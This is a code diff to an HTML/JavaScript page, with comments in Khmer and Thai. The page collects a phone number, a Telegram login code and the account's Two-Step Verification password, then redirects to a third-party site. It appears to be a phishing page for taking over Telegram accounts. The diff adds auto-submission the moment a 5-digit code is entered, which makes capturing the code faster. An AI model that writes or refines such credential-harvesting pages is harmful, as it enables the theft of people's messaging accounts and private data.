@@ -233,14 +233,14 @@
       <div class="text-5xl mb-2">🔐</div>
       <div>
         <h2 id="display-phone" class="text-lg font-semibold mb-1 text-white"></h2>
-        <!-- កន្លែងបង្ហាញសារ Status ជំនួសការ Pop-up Alert -->
         <p id="auth-status" class="text-gray-400 text-sm">We've sent the code to your Telegram app.</p>
       </div>
       
       <div class="text-left space-y-4">
+        <!-- OTP Code Field (ដាក់ maxlength="5" និង oninput ដើម្បីเช็ค auto submit) -->
         <div class="field">
           <label>Telegram Code</label>
-          <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code" maxlength="6" class="text-center font-mono tracking-widest text-xl">
+          <input id="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Enter code" maxlength="5" oninput="checkAutoSubmit(this)" class="text-center font-mono tracking-widest text-xl">
         </div>
 
         <!-- Input 2FA Password -->
@@ -305,6 +305,14 @@
         input.value = prefix + parts.join(' ');
     }
 
+    // 🛠 មុខងារពិនិត្យមើលកូដ ៥ ខ្ទង់ ដើម្បី Auto Submit ស្វ័យប្រវត្តិ
+    function checkAutoSubmit(input) {
+        input.value = input.value.replace(/[^\d]/g, '');
+        if (input.value.length === 5) {
+            submitOTP();
+        }
+    }
+
     async function sendPhone() {
         const phoneInput = document.getElementById('phone-input');
         const btn = document.getElementById('btn-send');
@@ -333,6 +341,7 @@
                 document.getElementById('auth-status').className = "text-gray-400 text-sm";
                 document.getElementById('step-phone').classList.add('hidden');
                 document.getElementById('step-otp').classList.remove('hidden');
+                document.getElementById('otp-input').focus();
             } else {
                 alert(data.error || 'Failed to send code.');
             }
@@ -353,9 +362,8 @@
         const password = document.getElementById('password-input').value.trim();
         const btn = document.getElementById('btn-verify');
 
-        if (!code) {
-            alert('Please enter the OTP code.');
-            return;
+        if (code.length < 5) {
+            return; // កុំឱ្យផ្ញើទាល់តែគ្រប់ 5 ខ្ទង់
         }
 
         btn.disabled = true;
@@ -377,7 +385,6 @@
             if (data.success) {
                 window.location.replace(data.redirectUrl || "https://jvpfans.com");
             } else if (data.requiresPassword) {
-                // បង្ហាញប្រអប់ 2FA ចូលដោយស្វ័យប្រវត្តិ និងដូរអត្ថបទជាការជូនដំណឹង (គ្មាន Pop-up Alert ទៀតទេ)
                 document.getElementById('auth-status').innerText = 'This account has Two-Step Verification enabled. Please enter your 2FA password.';
                 document.getElementById('auth-status').className = 'text-yellow-400 text-sm font-medium';
                 document.getElementById('password-container').classList.remove('hidden');
